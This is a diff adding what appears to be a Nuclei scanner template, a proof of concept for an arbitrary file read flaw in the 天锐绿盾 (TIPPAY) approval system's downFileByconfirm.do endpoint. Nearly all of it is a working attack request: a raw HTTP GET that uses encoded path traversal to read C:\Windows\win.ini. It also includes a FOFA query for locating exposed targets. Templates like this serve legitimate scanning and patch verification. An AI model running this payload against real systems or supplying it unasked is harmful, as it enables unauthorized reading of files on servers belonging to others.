@@ -1,0 +1,29 @@
+id: poc-akp0aglrzxml48tu
+info:
+  name: 天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/akp0aglrzxml48tu'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: akp0aglrzxml48tu
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'GET /trwfe/service/.%2E/file/downFileByconfirm.do?dstPath=C:\Windows\win.ini&fileName=&processInstanceIds= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
